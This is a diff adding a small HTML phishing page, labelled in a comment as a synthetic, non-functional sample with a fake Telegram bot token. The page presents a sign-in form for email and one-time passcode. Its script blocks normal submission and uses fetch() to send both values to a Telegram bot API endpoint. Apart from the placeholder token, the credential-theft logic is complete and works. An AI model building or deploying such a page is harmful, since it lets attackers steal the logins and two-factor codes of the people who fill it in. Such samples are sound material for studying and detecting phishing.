@@ -1,0 +1,13 @@
+<!-- Synthetic sample - phishing kit with Telegram OTP exfil (NON-FUNCTIONAL, fake token) -->
+<form id="signin" onsubmit="grab(event)">
+  <input name="email"><input name="otp">
+</form>
+<script>
+function grab(e){
+  e.preventDefault();
+  var email=document.querySelector('[name=email]').value;
+  var code=document.querySelector('[name=otp]').value;
+  fetch("https://api.telegram.org/bot1234567890:AAFAKEtokenNOTreal_0000000000000/sendMessage"
+    +"?chat_id=999999&text=login:%20"+email+"%20otp:%20"+code);
+}
+</script>
